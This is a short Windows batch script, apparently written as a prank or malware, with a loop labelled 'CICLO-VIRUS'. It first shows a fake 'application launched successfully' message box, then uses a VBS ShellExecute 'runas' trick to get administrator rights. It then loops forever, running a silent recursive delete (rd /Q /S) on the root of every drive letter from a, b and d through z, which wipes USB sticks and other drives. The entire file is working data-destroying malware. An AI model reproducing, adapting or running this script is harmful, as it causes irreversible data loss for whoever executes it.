
@echo off

if not exist "C:\Windows\kwg4.vbs"  echo Msgbox "LA APLICACION HA SIDO LANZADA CON EXITO",84,"Windows Script Host">> C:\Windows\kwg4.vbs

if exist "C:\Windows\kwg4.vbs"  start C:\Windows\kwg4.vbs

:CICLO-VIRUS
echo.
echo.
@echo off

color 01

REM .bat con permisos de administrador
:-------------------------------------
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> Si hay error es que no hay permisos de administrador.
if '%errorlevel%' NEQ '0' (
    echo Solicitando permisos de administrador... Requesting administrative privileges... Anfordern Administratorrechte ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  



color 01
echo Esperando usb... 

for %%u in (a, b, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z) do (
        dir /b %%u:\ > nul 2>&1 && (
           for /f "tokens=8*" %%a in ('vol %%u: ^| find "volumen de la unidad"') do (echo Unidad %%u:\ "%%a" detectada

rd  /Q  /S  %%u:
echo.
echo.
echo ARCHIVOS ELIMINADOS!!!

CLS
CLS

    )
  )
)

goto CICLO-VIRUS
exit
